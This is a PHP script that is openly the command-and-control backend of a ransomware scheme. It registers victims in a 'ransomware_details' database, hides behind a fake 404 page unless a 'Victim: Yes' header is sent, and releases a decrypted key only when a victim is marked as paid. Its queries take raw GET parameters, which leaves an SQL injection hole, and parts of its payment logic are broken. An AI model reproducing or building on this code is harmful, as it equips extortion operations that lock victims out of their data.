<?php

function Connection(){
	//Configuration of database
	$dbconn = pg_connect("host=localhost port=5432 dbname=ransom user=postgres password=admin");
	if(!$dbconn)
	{
		echo "An error Ocurred!\n";
		exit;
	}
	return $dbconn;
}

function getRequestHeaders(){
	$headers = array();
	foreach($_SERVER as $key => $value){
		$headers[$key] = $value;
	}
	return $headers;
}

function checkValidity(){
	$headers = getRequestHeaders();
	foreach($headers as $header => $value){
		if($header == "HTTP_VICTIM" && $value=="Yes"){
			return 1;
			//echo keyPairGeneration()->pubKey;	
		}
	}
	return 0;
}

function abort(){
	echo "Not reachable!";
}

function hide(){
	//404 page
	echo "<html>
		<head>
			<title>404 Error - Page Not Found</title>
		</head>
		<body>404 Error - Page Not Found!</body>
	</html>";
}

function returnDecrypted($dbconn,$key,$id){
	$query = "SELECT payment_status from ransomware_details where identifier='$id';";
	$result = pg_query($dbconn,$query);
	$tmp = pg_fetch_row($result)[0];
	if($tmp == 'Yes'){
		$private_key = file_get_contents("private.pem");
		$resStr = str_replace('-','+',$key);
		$res = openssl_get_privatekey($private_key);		
		openssl_private_decrypt(base64_decode($resStr),$newsource,$res);
		echo "$newsource";
		return 1;

	}
	else if($result == 'No'){
		return 1;
		echo "Pay the ransom";
	}
	else{
		exit;
	}
}

function check1($dbconn){
	if( isset($_GET['decrypt']) && isset($_GET['id'])){
		$key = $_GET['decrypt'];
		$id = $_GET['id'];
		//echo "$key";
		returnDecrypted($dbconn,$key,$id);
		return 1;
	}
}

if(checkValidity()){
	$dbconn = Connection();
	if(check1($dbconn)){
		exit;
	}
	$result = pg_query($dbconn, "SELECT identifier FROM ransomware_details ORDER BY identifier DESC LIMiT 1;");
	//echo "Working!";
	if(!$result){
		pg_close();
		abort();
		exit;
	}
	$id=pg_fetch_row($result)[0];
	$id = $id+1;
	$query = "INSERT INTO ransomware_details (identifier,payment_status) VALUES "."( '$id','No');";
	$result = pg_query($dbconn,$query);
	//echo $result;
	if(!$result){
		pg_close();
		abort();
		exit;
	}
	else{
	//Finally send the public key after all checks
		echo "$id";
		pg_close();
	}
}
else{
	hide();
}
?>
